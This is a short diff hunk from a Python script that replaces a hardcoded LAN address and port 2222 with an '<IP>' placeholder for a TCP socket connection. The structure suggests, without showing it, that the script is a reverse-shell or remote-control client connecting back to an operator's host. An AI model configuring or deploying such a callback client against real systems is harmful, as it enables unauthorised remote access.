@@ -66,8 +66,8 @@ if __name__ == '__main__':
     kill_flag = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        host_ip = '192.168.106.1'
-        host_port = 2222
+        host_ip = '<IP>' # Change IP
+        host_port = 2222 # Change Port
     except IndexError:
         print(' [-] Command Line argument(s) missing, Please Try again.')
     except Exception as e:
